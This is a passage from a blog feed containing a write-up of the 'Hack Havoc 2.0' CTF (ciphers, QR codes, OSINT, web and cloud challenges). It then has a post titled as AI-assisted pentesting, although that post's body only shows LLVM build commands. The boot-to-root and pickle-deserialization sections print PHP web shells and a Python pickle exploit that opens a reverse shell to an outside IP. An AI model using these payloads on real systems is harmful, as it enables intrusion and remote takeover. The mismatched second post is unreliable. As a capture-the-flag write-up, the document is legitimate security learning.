+</code></pre></div></div> <h2 id="analysis--solution">Analysis &amp; Solution</h2> <h3 id="1-initial-approach">1. Initial Approach</h3> <ul> <li>Conducted broad search for related content</li> <li>Found matching LinkedIn post</li> <li>Initial inspection revealed no immediate flags</li> <li>Re-evaluated challenge description for hints</li> </ul> <ol> <li>LinkedIn Post Analysis: <ul> <li>Located specific post matching description</li> <li>Initially reviewed images casually</li> <li>Found nothing suspicious at first glance</li> </ul> </li> <li>Challenge Description Review: <ul> <li>Key hint noticed: “hidden flag buried among the chaos”</li> <li>Suggested deeper visual inspection needed</li> <li>Carefully reviewed each image</li> <li>Paid attention to background details</li> <li>Located data within images</li> </ul> </li> </ol> <h2 id="rev">Rev</h2> <h3 id="more-like-enig-me">More Like ‘Enig-me’</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The Enigma Machine was a complex encryption device used by the German military during World War II. Its intricate design and multiple settings made it incredibly difficult to crack. In this challenge, you'll take on the role of a codebreaker and attempt to decipher a message encrypted using a modified Enigma Machine.
+
+Encoded txt : ugtyq djiwc ruejq ebdux hcrqr kiznu hokzy sngry zfxnv gbjki dqknr ma
+
+Decoded txt: cybermateial is the world number one cybersecurity data platform.
+
+Your flag follows the format CM{Rotor_x-x-x_Pos_x-x-x_Reflector_x_Plug_x-x_x-x_Ring_x-x-x}. Good luck decoding the mystery!"
+</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Challenge is updated 
+**Hint:** 
+Rotor:
+Hint: "These are the first three rotors historically used by the German military Enigma during WWII."
+Position:
+Hint: "The initial rotor positions are aligned with the start of the alphabet but include two letters beyond the first."
+Reflector:
+Hint: "This reflector was the most commonly used during the war, and it shares its name with the second letter of the alphabet."
+Plugboard:
+Hint: "The plugboard swaps involve pairs of letters commonly found at the start of words like 'Apple' and 'Tree,' and 'Banana' and 'Lemon.'"
+Ring Position:
+Hint: "The rings are set to the beginning of the alphabet, leaving no shifts at all."
+</code></pre></div></div> <ul> <li>Encrypted Message: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ugtyq djiwc ruejq ebdux hcrqr kiznu hokzy sngry zfxnv gbjki dqknr ma
+</code></pre></div> </div> <p><img src="/assets/Hack Havoc 2.0 CTF/Enigma.png" alt="Solution" width="250"/></p> </li> <li>Decrypted Text: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cybermateial is the world number one cybersecurity data platform.
+</code></pre></div> </div> </li> <li>Flag Format <strong>CM{Rotor_x-x-x_Pos_x-x-x_Reflector_x_Plug_x-x_x-x_Ring_x-x-x}</strong></li> <li>Flag <strong>CM{Rotor_I-II-III_Pos_A-D-F_Reflector_B_Plug_A-T_B-L_Ring_A-A-A}</strong></li> </ul> <h2 id="misc">Misc</h2> <h3 id="the-case-of-the-missing-flag">The Case of the Missing Flag</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Congratulations, detective! You’ve found ABC.dat, the file that’s about as exciting as watching paint dry. But wait! Rumor has it there’s a flag tucked away in there, possibly hiding RQ.
+
+Can you solve the mystery before your snacks run out? Get cracking, and may the bytes be ever in your favor!
+</code></pre></div></div> <ol> <li>First thing I tried was opening it in Notepad Cause it is a .dat file. That’s when I spotted something interesting - it was full of SVG code!</li> <li>Looking closer at the SVG code, I could tell it was forming some kind of QR code pattern. Pretty neat hiding spot!</li> <li>I converted the SVG to PNG format, thinking Google Lens might work. Surprisingly, it didn’t scan!</li> <li>Not giving up, I tried a different QR code scanner app on my phone - and boom! It worked!</li> </ol> <ul> <li>The QR code revealed: <strong>CopyCM{F0r3n3ic_1s_34sy}</strong></li> </ul> <h2 id="crypto">Crypto</h2> <h3 id="the-curious-case-of-the-jumbled-symbols">The Curious Case of the Jumbled Symbols</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dive into a tangled web of characters! Can you decode {╵⸍⸝╮ᛁ⸌ᛁ╵╵_◟╮ᛁ⸜╵_ᛙ╮ᚽ⸝◟ᛍ} ? Here’s a clue: It’s not what it seems—things aren’t always as clear as they appear. Good luck, puzzle master!
+
+Wrap Flag in CM{}
+</code></pre></div></div> <ul> <li>When I first saw this challenge, I was faced with this weird string of symbols: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{╵⸍⸝╮ᛁ⸌ᛁ╵╵_◟╮ᛁ⸜╵_ᛙ╮ᚽ⸝◟ᛍ}
+</code></pre></div> </div> <ol> <li>To be honest, it looked like a bunch of random symbols at first! But sometimes in CTFs, the simplest approach works best.</li> </ol> <ul> <li>The first thing I did was what any of us would do - I copied the symbols and pasted them into Google. Sometimes the direct approach is the best one!</li> <li>Through the search results, I discovered these were actually runes - ancient Germanic symbols used for writing.</li> <li>Found this super helpful website: Rune Translator</li> <li>Plugged the symbols in and got my translation</li> <li>Added the required “CM{}” wrapper since that’s our flag format</li> </ul> </li> </ul> <h3 id="cybermaterialhavoc">CyberMaterialHavoc</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We heard you're a great CybermaterialHavoc! 🧙‍♂️ Help us decode this baffling message: 🕵️‍♀️💥
+
+AgTIEe5hQ?T5,W.GDyv^N*eRcDuEoizyHNSTN&amp;b$$4m0o9gWL!S\u+^T;/o5m/9YL@HQlje}
+</code></pre></div></div> <ul> <li>Hint’s <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Make sure it has three steps  encryption with keys
+</code></pre></div> </div> </li> <li>I got this encrypted text that looked pretty messy: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AgTIEe5hQ?T5,W.GDyv^N*eRcDuEoizyHNSTN&amp;b$$4m0o9gWL!S\u+^T;/o5m/9YL@HQlje}
+</code></pre></div> </div> <ol> <li>Base92</li> </ol> <ul> <li>First step was obvious - figure out what kind of encoding/encryption this was</li> <li>I went to my go-to tool: dcode.fr</li> <li>The cipher identifier suggested Base92</li> <li>After decryption, got this: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ZL{YfphiGdxdicgo_Yzkqu'i_Cmtg_Qfpdiscxawtiz_Xdxl_Khdxcltu}
+</code></pre></div> </div> <ol> <li>Vigenère Cipher</li> </ol> </li> <li>Back to dcode.fr with the new text</li> <li>It identified as a Vigenère Cipher</li> <li>The tricky part - what’s the key?</li> <li>The challenge title “CyberMaterialHavoc” was highlighted - that was suspicious!</li> <li>Used “CyberMaterialHavoc”( But Why <strong>CyberMaterialHavoc</strong> ? Cause they highlighted that in description text lol ) as the key and got: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XN{XbyviNzgvirzo_Dliow'h_Yvhg_Xbyvihvxfirgb_Wzgz_Kozgulin}
+</code></pre></div> </div> <ol> <li>Atbash Cipher</li> </ol> </li> <li>One more time with dcode.fr</li> <li>Identified as Atbash Cipher</li> <li>Decrypted to get the final flag: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CM{CyberMaterial_World's_Best_Cybersecurity_Data_Platform}
+</code></pre></div> </div> </li> </ul> </li> </ul> <h2 id="boot-to-root">Boot To Root</h2> <h3 id="hackers-fortress">Hacker’s Fortress</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>In this boot-to-root exercise, participants will need to leverage their skills in file uploading and privilege escalation to uncover a hidden flag. The challenge simulates a real-world scenario where unauthorized access to a server must be achieved to find sensitive information.
+
+http://35.208.110.64
+</code></pre></div></div> <ol> <li>When I first started, I went down some rabbit holes: <ul> <li>Tried uploading various image files (jpg, png)</li> <li>Attempted basic shell uploads</li> <li>None of these worked!</li> </ul> </li> <li>After the failed attempts, I decided to try a simple PHP web shell. Here’s what worked: <ul> <li>PHP Shell <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;pre&gt;
+ &lt;?php
+   if(isset($_GET['cmd']))
+      {
+         system($_GET['cmd'] . ' 2&gt;&amp;1');
+      }
+ ?&gt;
+ &lt;/pre&gt;
+</code></pre></div> </div> </li> <li>Enhanced Shell Version (with HTML Form) <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
+ &lt;body&gt;
+ &lt;form method="GET" name="&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;"&gt;
+ &lt;input type="TEXT" name="cmd" autofocus id="cmd" size="80"&gt;
+ &lt;input type="SUBMIT" value="Execute"&gt;
+ &lt;/form&gt;
+ &lt;pre&gt;
+    &lt;?php
+        if(isset($_GET['cmd']))
+           {
+               system($_GET['cmd'] . ' 2&gt;&amp;1');
+           }
+   ?&gt;
+&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div> </div> </li> </ul> </li> </ol> <ul> <li>How I Found the Flag <ul> <li>Uploaded the PHP shell to the server</li> <li>Navigated to /uploads directory to access my shell</li> <li>Used ls -a command to list ALL files (including hidden ones)</li> <li>Boom! Found the flag: CTF{3sc4l4t3d_t0_r00t}</li> </ul> </li> </ul> <h2 id="web">Web</h2> <h3 id="hashing-numbers">Hashing Numbers</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To access its secrets, you must first prove your worth by calculating a mathematical expression, a test of both intellect and skill. Will you rise to the challenge and secure the sensitive information, or will the secrets remain forever locked away? The choice is yours.
+
+Flag structure: CM{XXX-###_##}
+
+https://sites.google.com/cybermaterial.com/hashing-numbers
+</code></pre></div></div> <ul> <li>My Initial Attempts (The Failed Ones) <ul> <li>Attempted command injection with shell=0&amp;pwn=1</li> <li>Looked for obvious parameters to manipulate</li> <li>Tried poking around the URL structure</li> </ul> </li> </ul> <ol> <li>Solution <ul> <li>Opened Developer Tools</li> <li>Inspected the page source</li> <li>Found the hidden information in the HTML Content.<br/> <img src="/assets/Hack Havoc 2.0 CTF/Hashing Numbers.png" alt="Challenge Image" width="250"/></li> </ul> </li> </ol> <h3 id="dir-dash">Dir Dash</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to the wackiest web quest of your life! 🚀 Somewhere in the depths of our webpage jungle you have Me.Let the digital madness begin! 🕵️‍♂️💻💥
+
+http://edition1.ctf.cybermaterial.com/
+</code></pre></div></div> <p><strong>Hints:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Domain//////hash............extensions
+hash as a directory and extensions with a hash what a combination lol
+</code></pre></div></div> <ol> <li>Enumeration <ul> <li>First thing I did was check for robots.txt because it’s always a good starting point: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://edition1.ctf.cybermaterial.com/robots.txt
+</code></pre></div> </div> </li> </ul> </li> <li>Found Two Hashes <ul> <li>In robots.txt, I discovered two interesting hashes: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c5ba7ff1883453170f7590fa689f1f48
+M8PQFA3ELTD%4BIA73EZ2
+</code></pre></div> </div> </li> </ul> </li> <li>Hash Analysis <ul> <li>Tried decrypting M8PQFA3ELTD%4BIA73EZ2 but got nowhere</li> <li>The first hash (c5ba7ff1883453170f7590fa689f1f48) looked more promising - it had the typical MD5 format</li> </ul> </li> <li>Brute Force Time! <ul> <li>Found a great wordlist for file extensions: <ul> <li>Used InfoSecWarrior’s File Extensions Wordlist</li> </ul> </li> <li>Started testing URLs in this format: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://edition1.ctf.cybermaterial.com/c5ba7ff1883453170f7590fa689f1f48FUZZ
+</code></pre></div> </div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> - Finally got a 200 OK response on: ``` http://edition1.ctf.cybermaterial.com/c5ba7ff1883453170f7590fa689f1f48.aspx ```
+</code></pre></div> </div> </li> </ul> </li> </ol> <h3 id="pickle-me-this-cookie-jar-shenanigans">Pickle Me This Cookie Jar Shenanigans!</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ever wondered what your cookies are hiding? This challenge dives into the mysterious world of serialized cookies with a twist of deserialization vulnerability. Use your Python skills and the pickle module to create a mischievous cart item that leads to a netcat reverse shell. Follow the breadcrumbs, set your traps, and see if you can hack your way to victory
+
+http://35.208.230.20/
+</code></pre></div></div> <ul> <li>When I first saw this challenge about pickle deserialization, I was completely lost. I had to: <ul> <li>Learn what deserialization vulnerabilities are Understand how pickle works in Python</li> </ul> </li> <li>After understanding the concept, I created this exploit: <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python3
+import pickle
+import os
+import base64
+import requests
+
+class RCE(object):
+  def __reduce__(self):
+      return (os.system,('''export RHOST="54.226.234.236";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' ''',))
+
+def main():
+  pickledPayload = base64.b64encode(pickle.dumps(RCE())).decode()
+  print(f'[*] Generated malicious cookie payload: {pickledPayload}')
+
+if __name__ == '__main__':
+  main()
+</code></pre></div> </div> </li> <li>Set up my netcat listener</li> <li>Injected the payload into the cookie</li> <li>Got shell access!</li> <li>Found flag.md which contained: <strong>CM{c0Ngr47S_y0u_ArE_A_Ser1A1_KI11er}</strong></li> </ul> <h2 id="forensic">Forensic</h2> <h3 id="qr-azy-mystery">QR-azy Mystery!</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Can you turn this pixel mush into glory?
+
+Please access challenge file in https://ctf.cybermaterial.com/files/93f67ade17f00899b51e4bde54245174/4_666_555_3_33_66_0_4_2_8_33_0_22_7.txt?token=eyJ1c2VyX2lkIjoxNCwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6MTB9.Zyjyaw.X53uGVg6PZGoQVpIcI5QaLpRpDQ
+</code></pre></div></div> <ul> <li>Unblurring the Image: I utilized the unblur feature on my smartphone, which helped bring out some details in the image.</li> <li>Using Google Lens: After enhancing the image, I scanned it with Google Lens to extract any text embedded within.</li> </ul> <h3 id="dialing-for-danger">Dialing for Danger</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Oops! Two not-so-smooth criminals just spilled the beans during a phone chat on a brick phone! 📞🎶 Crack the location before their next mischief unfolds. Find the place befor attack
+
+Flag: Wrap it in CM { First_second_third }
+
+https://ctf.cybermaterial.com/files/93f67ade17f00899b51e4bde54245174/4_666_555_3_33_66_0_4_2_8_33_0_22_7.txt?token=eyJ1c2VyX2lkIjoxNCwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6MTB9.Zyjyaw.X53uGVg6PZGoQVpIcI5QaLpRpDQ
+</code></pre></div></div> <p>Eassy Challenge</p> <ul> <li>The second challenge was even more thrilling. <ul> <li>I had to decode a message hidden within a sequence of numbers found in a text file named 4_666_555_3_33_66_0_4_2_8_33_0_22_7.txt.</li> <li>The number sequence, 4 666 555 3 33 66 0 4 2 8 33 0 22 777 444 3 4 33, was encoded using a classic phone keypad system.</li> </ul> </li> <li>Decoding the Message <ul> <li>By translating the numbers, I discovered the following:</li> <li>4 666 555 3 33 66 = GOLDEN</li> <li>4 2 8 33 = GATE</li> <li>22 777 444 3 4 33 = BRIDGE</li> </ul> </li> </ul> <p>Combining these decoded words, the final flag for this challenge is:<strong>CM{GOLDEN_GATE_BRIDGE}</strong>.</p> <h2 id="cloud">Cloud</h2> <h3 id="cloudy-records">Cloudy Records</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cloudy Records
+
+A sensitive data leak has occurred at the fictional company "CloudCorps." As a security expert, your job is to find their exposed Cloud Storage bucket and retrieve the flag.
+
+https://hallofhacks.com/
+</code></pre></div></div> <ul> <li> <p>Initially, I approached the challenge with a variety of tools like Cloud Enum and other online resources to identify any open buckets. However, after multiple attempts, I found myself hitting a wall with no success in uncovering the bucket.</p> </li> <li> <p>I revisited the domain information and began digging deeper into various records, including TXT, DNS, and mail server records. This approach paid off when I discovered an open bucket link in the DNS records:</p> </li> <li> <p>https://storage.googleapis.com/cloudcorps-important</p> </li> <li> <p>I explored its contents and found a PDF file named Hall_of_Hacks_2.pdf. Inside this file was the flag for the challenge: Flag: <strong>CM{GCP_CloudStorage_Bucket_Challenge_20241018}</strong></p> </li> </ul>]]></content><author><name></name></author><category term="pwn"/><category term="web"/><category term="Osint"/><category term="Forensic"/><category term="Cloud"/><summary type="html"><![CDATA[Detailed writeup of [Hack Havoc 2.0](https://ctf.cybermaterial.com/challenges) CTF challenges and solutions]]></summary></entry><entry><title type="html">Automating Pentest using Tool’s &amp;amp; Copilot’s</title><link href="https://oxapavan.github.io/blog/2024/writing-an-llvm-pass/" rel="alternate" type="text/html" title="Automating Pentest using Tool’s &amp;amp; Copilot’s"/><published>2024-10-28T00:00:00+00:00</published><updated>2024-10-28T00:00:00+00:00</updated><id>https://oxapavan.github.io/blog/2024/writing-an-llvm-pass</id><content type="html" xml:base="https://oxapavan.github.io/blog/2024/writing-an-llvm-pass/"><![CDATA[<h5 id="next-generation-pentesting-ai-copilots-and-automation-in-practice-explores-the-seamless-integration-of-artificial-intelligence-and-automation-into-modern-penetration-testing-workflows-this-comprehensive-guide-demonstrates-how-security-professionals-can-leverage-ai-copilots-and-automated-tools-to-enhance-vulnerability-detection-streamline-assessments-and-augment-human-expertise-while-maintaining-professional-oversight-through-practical-implementations-and-real-world-case-studies-readers-will-learn-to-build-effective-testing-frameworks-that-combine-traditional-methodologies-with-cutting-edge-ai-capabilities">Next-Generation Pentesting: AI Copilots and Automation in Practice” explores the seamless integration of artificial intelligence and automation into modern penetration testing workflows. This comprehensive guide demonstrates how security professionals can leverage AI copilots and automated tools to enhance vulnerability detection, streamline assessments, and augment human expertise while maintaining professional oversight. Through practical implementations and real-world case studies, readers will learn to build effective testing frameworks that combine traditional methodologies with cutting-edge AI capabilities.</h5> <h2 id="compile-llvm-from-source">Compile LLVM from source</h2> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone git@github.com:llvm/llvm-project.git
+<span class="nb">pushd </span>llvm-project
+    git checkout llvmorg-10.0.1
+    <span class="nb">mkdir </span>build
+    <span class="nb">pushd </span>build
+        cmake <span class="nt">-G</span> <span class="s2">"Unix Makefiles"</span> <span class="se">\</span>
+            <span class="nt">-DLLVM_ENABLE_PROJECTS</span><span class="o">=</span><span class="s2">"clang;libcxx;libcxxabi"</span> <span class="se">\</span>
+            <span class="nt">-DCMAKE_BUILD_TYPE</span><span class="o">=</span>DEBUG <span class="se">\</span>
+            ../llvm
+        cmake <span class="nt">--build</span> <span class="nb">.</span>
+        make <span class="nt">-j</span><span class="si">$(</span><span class="nb">nproc</span><span class="si">)</span>
+    <span class="nb">popd
+popd</span>
+</code></pre></div></div> <h2 id="commands">Commands</h2> <ul> <li>Generate LLVM IR:</li> </ul> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Textual form
+clang -O1 -emit-llvm input.c -S -o out.ll
+# Binary/bit-code form
+clang -O1 -emit-llvm input.c -c -o out.bc
+</code></pre></div></div> <ul> <li>Run <code class="language-plaintext highlighter-rouge">HelloWorld</code> pass with <code class="language-plaintext highlighter-rouge">opt</code></li> </ul> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>opt <span class="nt">-load-pass-plugin</span> ./libHelloWorld.<span class="o">{</span>so|dylib<span class="o">}</span> <span class="nt">-passes</span><span class="o">=</span>hello-world <span class="nt">-disable-output</span> input_for_hello.ll
+</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[Next-Generation Pentesting: AI Copilots and Automation in Practice” explores the seamless integration of artificial intelligence and automation into modern penetration testing workflows. This comprehensive guide demonstrates how security professionals can leverage AI copilots and automated tools to enhance vulnerability detection, streamline assessments, and augment human expertise while maintaining professional oversight. Through practical implementations and real-world case studies, readers will learn to build effective testing frameworks that combine traditional methodologies with cutting-edge AI capabilities.]]></summary></entry></feed>
